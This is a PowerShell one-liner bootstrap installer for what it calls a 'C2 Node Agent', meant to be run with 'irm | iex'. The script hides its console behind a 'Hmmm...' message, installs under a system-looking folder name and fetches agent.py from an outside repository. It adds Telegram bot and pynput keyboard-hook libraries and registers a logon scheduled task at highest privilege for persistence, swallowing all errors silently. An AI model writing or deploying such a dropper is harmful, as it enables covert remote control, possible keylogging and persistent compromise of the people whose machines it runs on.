<#
.SYNOPSIS
    C2 Node Agent - One-Liner Bootstrap Installer (Clean Install)
    
.DESCRIPTION
    This script sets up the C2 Node Agent on a Windows machine.
    Modes:
    - Admin (Default): Requires/Requests elevation, registers High-privilege task, updates Machine PATH.
    - Normal: Runs as current user, registers User-level task, updates User PATH only.

.NOTES
    Run with: irm https://your-gist-url/install.ps1 | iex
#>

param(
    [string]$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache",
    [string]$Mode = "Admin", # Options: "Admin", "Normal"
    [switch]$Force
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# =============================================================================
# UI & HELPER FUNCTIONS
# =============================================================================

function Show-Spinner {
    param([string]$Message = "Hmmm...")
    Write-Host -NoNewline "$Message"
}

function Hide-Console {
    $code = @'
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
'@
    try {
        $type = Add-Type -MemberDefinition $code -Name "Win32Hide" -Namespace Win32 -PassThru
        $hwnd = $type::GetConsoleWindow()
        if ($hwnd -ne [IntPtr]::Zero) {
            $type::ShowWindow($hwnd, 0) # 0 = SW_HIDE
        }
    } catch {
        # Ignore if hiding fails
    }
}

function Test-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# =============================================================================
# INITIALIZATION & ELEVATION CHECK
# =============================================================================

Clear-Host

# Interactive Admin Prompt
if (-not (Test-Admin)) {
    Write-Host "C2 Agent Installer" -ForegroundColor Cyan
    $response = Read-Host "Allow Administrator features (Auto-Start, System Persistence)? (y/n)"
    
    if ($response -match "^[yY]") {
        $Mode = "Admin"
    } else {
        $Mode = "Normal"
    }
} else {
    $Mode = "Admin" # Already admin, default to admin mode
}

# Hiding Window Immediately after user interaction
Hide-Console
Show-Spinner "Hmmm..."

# Self-Elevation Logic (Only for Admin Mode)
if ($Mode -eq "Admin") {
    if (-not (Test-Admin)) {
        # Check if we are running from a file or script block
        try {
            # Try to restart this script as Admin
            if ($PSCommandPath) {
                Start-Process powerShell -ArgumentList "-NoProfile", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"", "-Mode Admin", "-Force" -Verb RunAs
                [Environment]::Exit(0)
            } else {
                # If running via IEX, we can't easily self-elevate.
                # Since user EXPLICITLY requested Admin, we should warn them.
                # But since the console is hidden now, we can't warn easily.
                # We will just proceed in Normal mode as a fallback to ensure *something* runs.
                $Mode = "Normal"
            }
        } catch {
            $Mode = "Normal"
        }
    }
}

# =============================================================================
# MAIN INSTALLATION LOGIC
# =============================================================================

try {
    # 1. Cleanup (Silent)
    # -------------------------------------------------------------------------
    try {
        # Kill processes
        $procs = Get-WmiObject Win32_Process | Where-Object { 
            ($_.Name -eq "python.exe" -or $_.Name -eq "pythonw.exe") -and ($_.CommandLine -like "*agent.py*")
        }
        if ($procs) {
            foreach ($p in $procs) {
                Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
            }
        }
        
        # Remove Tasks
        if ($Mode -eq "Admin") {
            Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } else {
            # Non-admin remove
             Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        }
    } catch { }

    # 2. Python Setup
    # -------------------------------------------------------------------------
    $pythonPath = $null
    
    # Check existing
    try {
        if (Get-Command "python" -ErrorAction SilentlyContinue) {
            $pythonPath = (Get-Command "python").Source
        }
    } catch {}

    # Install if missing (Winget - only attempts in Admin or if user has permissions)
    if (-not $pythonPath) {
        try {
            winget install Python.Python.3.12 --accept-source-agreements --accept-package-agreements --silent --disable-interactivity | Out-Null
            
            # Update Path
            if ($Mode -eq "Admin") {
                $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
            } else {
                $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "User")
            }
            
            $pythonPath = (Get-Command "python" -ErrorAction SilentlyContinue).Source
        } catch {}
    }
    
    # Fallback to local python or error if still missing? 
    # For "Hmmm..." silent install, we best effort.
    if (-not $pythonPath) {
        # Critical failure, but keep it silent/short?
        # User wants "Hmmm..." then close. 
        # But if we fail, we probably should at least leave a log file?
        # We will exit silently as requested "auto close terminal when everything ends".
        exit 1
    }

    $pythonDir = Split-Path $pythonPath
    $pythonwPath = Join-Path $pythonDir "pythonw.exe"
    if (-not (Test-Path $pythonwPath)) { $pythonwPath = $pythonPath }

    # 3. Project Files
    # -------------------------------------------------------------------------
    if (-not (Test-Path $InstallPath)) {
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    }
    
    $agentPyPath = Join-Path $InstallPath "agent.py"
    if (-not (Test-Path $agentPyPath)) {
        try {
            $downloadUrl = "https://raw.githubusercontent.com/adnansamirswe/c2master/main/backend/agent.py"
            # Actual download
             Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing -ErrorAction SilentlyContinue
             
             # Fallback if download failed (since we don't have internet in tests usually)
             if (-not (Test-Path $agentPyPath)) {
                @"
# C2 Agent - Placeholder
import time
while True: time.sleep(60)
"@ | Set-Content -Path $agentPyPath -Encoding UTF8
             }
        } catch {}
    }

    # 4. Virtual Env & Deps
    # -------------------------------------------------------------------------
    $venvPath = Join-Path $InstallPath "venv"
    if (-not (Test-Path $venvPath)) {
        & $pythonPath -m venv $venvPath | Out-Null
    }
    
    $venvPython = Join-Path $venvPath "Scripts\python.exe"
    $venvPythonw = Join-Path $venvPath "Scripts\pythonw.exe"
    
    $reqFile = Join-Path $InstallPath "requirements.txt"
    @"
python-telegram-bot>=21.0
httpx>=0.27.0
pynput>=1.7.0
"@ | Set-Content -Path $reqFile -Encoding UTF8

    & $venvPython -m pip install -r $reqFile --quiet --disable-pip-version-check | Out-Null

    # 5. Scheduled Task
    # -------------------------------------------------------------------------
    $taskName = "C2Agent"
    $action = New-ScheduledTaskAction -Execute $venvPythonw -Argument "`"$agentPyPath`"" -WorkingDirectory $InstallPath
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    
    if ($Mode -eq "Admin") {
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive
    } else {
        # Normal Mode: Run as current user, standard privileges
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited -LogonType Interactive
    }
    
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -ExecutionTimeLimit (New-TimeSpan -Days 365)
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
    
    # Start it
    Start-ScheduledTask -TaskName $taskName | Out-Null

} catch {
    # Swallow errors for the "Hmmm..." aesthetic
}

# =============================================================================
# CLEAN EXIT
# =============================================================================

# Close the terminal window
[Environment]::Exit(0)
